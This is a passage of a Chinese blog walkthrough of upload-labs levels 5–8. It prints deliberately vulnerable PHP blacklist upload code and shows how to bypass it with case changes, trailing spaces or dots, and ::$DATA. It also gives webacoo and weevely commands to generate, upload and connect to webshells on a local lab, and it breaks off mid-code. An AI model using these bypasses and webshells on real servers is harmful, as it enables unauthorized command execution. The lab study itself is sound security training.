+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585752661408.png" alt="1585720364221"></p>
+<p>复制图片地址在浏览器中打开</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585752688760.png" alt="1585720385618"></p>
+<h4 id="绕过黑名单验证-大小写绕过"><a href="#绕过黑名单验证-大小写绕过" class="headerlink" title="绕过黑名单验证(大小写绕过)"></a>绕过黑名单验证(大小写绕过)</h4><p>upload-labs第五关</p>
+<h5 id="大小写绕过原理"><a href="#大小写绕过原理" class="headerlink" title="大小写绕过原理"></a>大小写绕过原理</h5><p>Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的</p>
+<h5 id="基于黑名单验证的代码分析"><a href="#基于黑名单验证的代码分析" class="headerlink" title="基于黑名单验证的代码分析"></a>基于黑名单验证的代码分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">&#x2F;&#x2F; 黑名单中也没有大小写，例如：如果输入php会被过滤但是输入PhP就不会被过滤</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">    &#x2F;&#x2F; 过滤不包含大小写过滤</span><br><span class="line">        &#x2F;&#x2F; 将上传的文件去空格</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="直接修改后缀名php上传文件件"><a href="#直接修改后缀名php上传文件件" class="headerlink" title="直接修改后缀名php上传文件件"></a>直接修改后缀名php上传文件件</h5><p>以上代码发现大P小h大P(PhP)并没有被过滤，直接修改文件后缀名为PhP进行绕过</p>
+<p>文件后缀名不一定必须在BurpSutie截断的HTTP请求中修改，可以直接修改文件后缀名进行上传</p>
+<p>先上传正常php文件查看是否会报错，报错</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786460300.png" alt="1585752615261"></p>
+<p>上传经过大小写的PhP文件，返回了一个图片</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786424435.png" alt="1585752661408"></p>
+<p>右键图片地址在页面中打开，成功返回</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786724856.png" alt="1585752688760"></p>
+<p>phpinfo执行效果有限，对站点测试也是有限的</p>
+<h4 id="WebaCoo上传Webshell"><a href="#WebaCoo上传Webshell" class="headerlink" title="WebaCoo上传Webshell"></a>WebaCoo上传Webshell</h4><p>WebaCoo生成Webshell：webacoo -g -o a.php</p>
+<p>上传Webshell</p>
+<p>连接Webshell：webacoo -t -u Webshell地址</p>
+<h5 id="在kali中使用webacoo新建一个a-php文件"><a href="#在kali中使用webacoo新建一个a-php文件" class="headerlink" title="在kali中使用webacoo新建一个a.php文件"></a>在kali中使用webacoo新建一个a.php文件</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786501683.png" alt="1585786424435"></p>
+<p>将文件复制到本地文件中，将后缀名改为大小写结合的PhP</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788326217.png" alt="1585786460300"></p>
+<p>上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788531529.png" alt="1585786501683"></p>
+<p>复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令</p>
+<p>注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1</p>
+<p>webacoo -t -u “<a href="http://127.0.0.1/upload-labs/upload/a.PhP&quot;" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/upload/a.PhP&quot;</a></p>
+<p>我们需要修改成本地地址<br>打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786793204.png" alt="1585786724856"></p>
+<p>使用ipconfig可以查看本地ip等等</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585789066134.png" alt="1585786793204"></p>
+<h4 id="绕过黑名单验证-空格绕过"><a href="#绕过黑名单验证-空格绕过" class="headerlink" title="绕过黑名单验证(空格绕过)"></a>绕过黑名单验证(空格绕过)</h4><p>upload-labs第六关</p>
+<h5 id="空格绕过原理"><a href="#空格绕过原理" class="headerlink" title="空格绕过原理"></a>空格绕过原理</h5><p><strong>Winodws系统</strong>下，对于文件名中空格会被作为空处理，程序中的监测代码如果不能自动删除空格，这样就可以利用空格绕过黑名单</p>
+<p>针对这样的情况需要使用Burpsuite截断HTTP请求之后，修改对应的文件名 添加空格</p>
+<h5 id="基于黑名单验证代码分析-1"><a href="#基于黑名单验证代码分析-1" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">     #这里并没有使用$file_ext&#x3D;trim($file_ext);来进行收尾去空的操作，可以使用空格绕过</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="BurpSuite绕过黑名单验证-1"><a href="#BurpSuite绕过黑名单验证-1" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>利用BurpSuite工具截断HTTP请求，对上传的文件名后加空格</p>
+<p>上传一个带有一句话木马的文件，使用BurpSuite抓包</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788386815.png" alt="1585788326217"></p>
+<p>在红线处的文件名后面加空格，先不加空格查看能否上传成功，上传失败</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788446309.png" alt="1585788386815"></p>
+<p>加上空格</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585790765067.png" alt="1585788446309"></p>
+<p>forward进行放行，返回空白图，复制图片连接，打开新的页面将其复制运行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585791409841.png" alt="1585788531529"></p>
+<p>运行完成后复制地址，打开蚁剑或者菜刀进行连接，连接成功，表示成功绕过</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585790833237.png" alt="1585789066134"></p>
+<h5 id="WebShell生成与上传"><a href="#WebShell生成与上传" class="headerlink" title="WebShell生成与上传"></a>WebShell生成与上传</h5><p>-g 表示生成</p>
+<p>-o 输出到webshell.php</p>
+<p>可以使用webacoo生成webshell：webacoo -g -o webshell.php</p>
+<p>BurpSuite截断HTTP请求 ，修改对应的文件名，添加空格</p>
+<p>-t 表示使用终端，链接之后反弹回来的可以执行cmd的终端</p>
+<p>-u 表示URL</p>
+<p>使用Webacoo连个上传成功地webshell：webacoo -t -u “URL”</p>
+<h5 id="使用webacoo生成一个webshell"><a href="#使用webacoo生成一个webshell" class="headerlink" title="使用webacoo生成一个webshell"></a>使用webacoo生成一个webshell</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585791585340.png" alt="1585790765067"></p>
+<h5 id="页面上传并拦截，在文件或加空格绕过"><a href="#页面上传并拦截，在文件或加空格绕过" class="headerlink" title="页面上传并拦截，在文件或加空格绕过"></a>页面上传并拦截，在文件或加空格绕过</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585790717378.png" alt="1585790717378"></p>
+<h5 id="复制图片连接打开新的页面，将地址复制，查看。页面返回空白"><a href="#复制图片连接打开新的页面，将地址复制，查看。页面返回空白" class="headerlink" title="复制图片连接打开新的页面，将地址复制，查看。页面返回空白"></a>复制图片连接打开新的页面，将地址复制，查看。页面返回空白</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585790969715.png" alt="1585790833237"></p>
+<h5 id="win-r打开cmd，查看当前ip，然后将图片地址复制，将其中的127-0-0-1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确"><a href="#win-r打开cmd，查看当前ip，然后将图片地址复制，将其中的127-0-0-1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确" class="headerlink" title="win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确"></a>win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585795278322.png" alt="1585790969715"></p>
+<p>可以使用cmd命令</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585795727897.png" alt="1585791409841"></p>
+<p>netstat -an命令式查看所有和本地计算机建立连接的IP</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585795307541.png" alt="1585791585340"></p>
+<h4 id="绕过黑名单验证-号绕过"><a href="#绕过黑名单验证-号绕过" class="headerlink" title="绕过黑名单验证(.号绕过)"></a>绕过黑名单验证(.号绕过)</h4><p>upload-labs第七关</p>
+<h5 id="号绕过原理"><a href="#号绕过原理" class="headerlink" title=".号绕过原理"></a>.号绕过原理</h5><p>Windows系统下，文件后缀名最后一个点会被自动去除</p>
+<p>例如：在桌面新建一个1.php. 系统会自动删除最后一个点</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585795641512.png" alt="1585795278322"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585796181897.png" alt="1585795307541"></p>
+<h5 id="基于黑名单验证代码分析-2"><a href="#基于黑名单验证代码分析-2" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        &#x2F;&#x2F; 加入去空格处理，不能使用空格绕过</span><br><span class="line">        &#x2F;&#x2F; 但是没有删除deldot这个.号，这样就可以利用Windows特性进行.号绕过</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        &#x2F;&#x2F; 进行了大小写转换，也不能进行大小写绕过</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="BurpSuite绕过黑名单验证-2"><a href="#BurpSuite绕过黑名单验证-2" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>上传php文件，在文件后加上.号，放行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585796542966.png" alt="1585795641512"></p>
+<p>返回空白文档，复制图片地址，在新页面打开，复制连接使用蚁剑连接</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585797553049.png" alt="1585795727897"></p>
+<h5 id="生成并上传webshell"><a href="#生成并上传webshell" class="headerlink" title="生成并上传webshell"></a>生成并上传webshell</h5><p>使用weevely生成webshell并上传</p>
+<p>1、生成：weevely generate 密码 路径 文件名</p>
+<p>2、上传</p>
+<p>3、连接：weevely shell文件地址 密码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585796883135.png" alt="1585796181897"></p>
+<p>上传使用burp抓包加.放行复制图片地址，在新的页面运行，再次复制地址，在kali中上传</p>
+<p>注意：将127.0.0.1改为本地ip</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200404173701730.png" alt="1585796542966"></p>
+<p>可以使用help查看一下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200404180024578.png" alt="1585796883135"></p>
+<p>查看其中的一个net_scan端口扫描</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200404180118148.png" alt="1585797553049"></p>
+<h4 id="绕过黑名单验证-特殊符号"><a href="#绕过黑名单验证-特殊符号" class="headerlink" title="绕过黑名单验证(特殊符号)"></a>绕过黑名单验证(特殊符号)</h4><p>upload-labs第八关</p>
+<h5 id="1、特殊符号绕过原理"><a href="#1、特殊符号绕过原理" class="headerlink" title="1、特殊符号绕过原理"></a>1、特殊符号绕过原理</h5><p>Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析</p>
+<p>例如：在windows系统下新建一个文件名为1.php::$DATA的文件，查看效果。但是在Window下新建的文件名中，包含特殊符号不能成功新建</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405082756442.png" alt="1585798158128"></p>
+<p>因为在Windows下不能建带有特殊符号的文本，所以在kali中新建</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083301173.png" alt="image-20200405082756442"></p>
+<h5 id="2、基于黑名单验证代码分析"><a href="#2、基于黑名单验证代码分析" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 去空格，去末尾的点，转换大小写，首尾去空</span><br><span class="line">        &#x2F;&#x2F; 并没有黑名单过滤::这个符号和$DATA这个变量(::$DATA)</span><br><span class="line">        &#x2F;&#x2F; $DATA这个变量是ADS NTFS系统，所具有的一种格式，数据流</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果在Windows下使用1.php::$DATA系统会直接修改为,1.php，去掉::$DATA，因为Windows不支持文件有特殊符号，通过这种方式就可以绕过黑名单检测，以后在检测黑名单时一定要将这个内容去除掉，否则黑名单很容易被绕过。。。当然过滤时不推荐使用黑名单，推荐白名单，毕竟黑名单出现的漏洞太多。</p>
+<h5 id="3、直接上传1-php-DATA"><a href="#3、直接上传1-php-DATA" class="headerlink" title="3、直接上传1.php::$DATA"></a>3、直接上传1.php::$DATA</h5><p>首先尝试能否上传正常图片，格式正常上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083527548.png" alt="image-20200405083301173"></p>
+<p>成功上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083318629.png" alt="image-20200405083318629"></p>
+<p>上传带有特殊符号的php文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585798158128.png" alt="image-20200405083527548"></p>
+<p>页面返回空白图片</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083719450.png" alt="image-20200405083545100"></p>
+<p>复制当前图片连接，使用菜刀或者蚁剑连接php脚本，将::$DATA特殊符号删除，进行连接，aaa是当时webshell中设置的密码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083545100.png" alt="image-20200405083719450"></p>
+<p>成功连接</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083944908.png" alt="image-20200405083944908"></p>
+<h5 id="第三方WebShell上传"><a href="#第三方WebShell上传" class="headerlink" title="第三方WebShell上传"></a>第三方WebShell上传</h5><p>可以在网上找到一些公开的第三方WebShell</p>
+<h4 id="绕过黑名单验证-路径拼接绕过"><a href="#绕过黑名单验证-路径拼接绕过" class="headerlink" title="绕过黑名单验证(路径拼接绕过)"></a>绕过黑名单验证(路径拼接绕过)</h4><h5 id="1、路径拼接绕过原理"><a href="#1、路径拼接绕过原理" class="headerlink" title="1、路径拼接绕过原理"></a>1、路径拼接绕过原理</h5><p>在没有对上传的文件进行重命名的请胯下，用户可以自定义文件名并在服务器上传新建，就会造成对应的绕过黑名单</p>
+<p>例如：</p>
+<p>用户新建    1.php.+空格+.</p>
+<p>deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.。</p>
+<p>利用windows特性自动去除最后一个点，导致上传成功</p>
+<p>所谓路径拼接，就是文件名直接拼接到上传的路径当中</p>
+<h5 id="2、基于黑名单验证码代码分析"><a href="#2、基于黑名单验证码代码分析" class="headerlink" title="2、基于黑名单验证码代码分析"></a>2、基于黑名单验证码代码分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; 